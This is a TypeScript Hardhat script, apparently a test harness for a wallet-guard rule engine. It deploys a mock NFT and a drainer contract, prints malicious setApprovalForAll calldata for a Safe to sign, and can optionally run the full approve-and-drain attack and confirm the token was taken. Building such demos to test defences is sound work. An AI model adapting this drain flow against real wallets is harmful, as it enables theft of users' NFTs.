/**
 * Drainer demo script (#14).
 *
 * Runnable against any JSON-RPC endpoint Hardhat knows about - a local
 * Anvil instance (`anvil` in one terminal, then `--network localhost`
 * here) or a real testnet (`--network sepolia`) - there is nothing
 * Anvil-specific in this script itself.
 *
 *   npx hardhat run scripts/drainerDemo.ts --network localhost
 *   npx hardhat run scripts/drainerDemo.ts --network sepolia
 *
 * Env vars (all optional):
 *   NFT_ADDRESS       - reuse an existing MockDrainableNFT instead of deploying one
 *   ATTACKER_ADDRESS  - reuse an existing DrainerAttacker instead of deploying one
 *   VICTIM_ADDRESS    - who "owns" the NFT the attack targets (defaults to signer[1] -
 *                       stand-in for the demo Safe when one isn't wired up yet)
 *   ATTEMPT_DRAIN     - "true" to also execute the full attack locally (approve, wait,
 *                       drain) and prove the token actually moved. Without it, the
 *                       script only prints the malicious calldata to propose.
 */
import { ethers } from "hardhat"

async function main() {
  const [deployer, defaultVictim] = await ethers.getSigners()
  const victimAddress = process.env.VICTIM_ADDRESS ?? defaultVictim.address

  const nft = process.env.NFT_ADDRESS
    ? await ethers.getContractAt("MockDrainableNFT", process.env.NFT_ADDRESS)
    : await (await ethers.getContractFactory("MockDrainableNFT")).deploy()
  const nftAddress = await nft.getAddress()

  const attacker = process.env.ATTACKER_ADDRESS
    ? await ethers.getContractAt("DrainerAttacker", process.env.ATTACKER_ADDRESS)
    : await (await ethers.getContractFactory("DrainerAttacker")).deploy()
  const attackerAddress = await attacker.getAddress()

  const mintTx = await nft.mint(victimAddress)
  const mintReceipt = await mintTx.wait()
  const tokenId = 0n // MockDrainableNFT.nextTokenId starts at 0; first mint is always token 0 on a fresh contract

  const approvalData = nft.interface.encodeFunctionData("setApprovalForAll", [attackerAddress, true])

  console.log("=== Drainer demo payload ===")
  console.log("Target NFT contract   (freshly-deployed, unverified-looking):", nftAddress)
  console.log("Attacker contract:                                          ", attackerAddress)
  console.log("Victim / demo-Safe stand-in:                                ", victimAddress)
  console.log("Minted token id:                                            ", tokenId.toString())
  console.log("")
  console.log("Propose this exact transaction from the Safe:")
  console.log(JSON.stringify({ to: nftAddress, value: "0", data: approvalData }, null, 2))
  console.log("(selector 0xa22cb465 = setApprovalForAll - this is what the rule engine (#9) is built to catch)")

  if (process.env.ATTEMPT_DRAIN !== "true") {
    console.log("\nSet ATTEMPT_DRAIN=true to also run the full attack locally and prove it works.")
    return
  }

  console.log("\n=== Executing the full attack locally (no Guard in the loop) ===")
  const ownerBefore: string = await nft.ownerOf(tokenId)
  console.log("Owner before:", ownerBefore)

  const victimSigner = process.env.VICTIM_ADDRESS ? undefined : defaultVictim
  if (!victimSigner) {
    throw new Error("ATTEMPT_DRAIN requires a local signer for the victim - unset VICTIM_ADDRESS to use one")
  }

  await (await nft.connect(victimSigner).setApprovalForAll(attackerAddress, true)).wait()
  console.log("Victim signed the approval. Waiting 3s, as a real attacker would...")
  await new Promise((resolve) => setTimeout(resolve, 3000))

  await (await attacker.drain(nftAddress, victimAddress, tokenId)).wait()
  const ownerAfter: string = await nft.ownerOf(tokenId)
  console.log("Owner after: ", ownerAfter)
  console.log(ownerAfter === attackerAddress ? "Token drained." : "Drain did not succeed.")

  void deployer
  void mintReceipt
}

main().catch((err) => {
  console.error(err)
  process.exitCode = 1
})
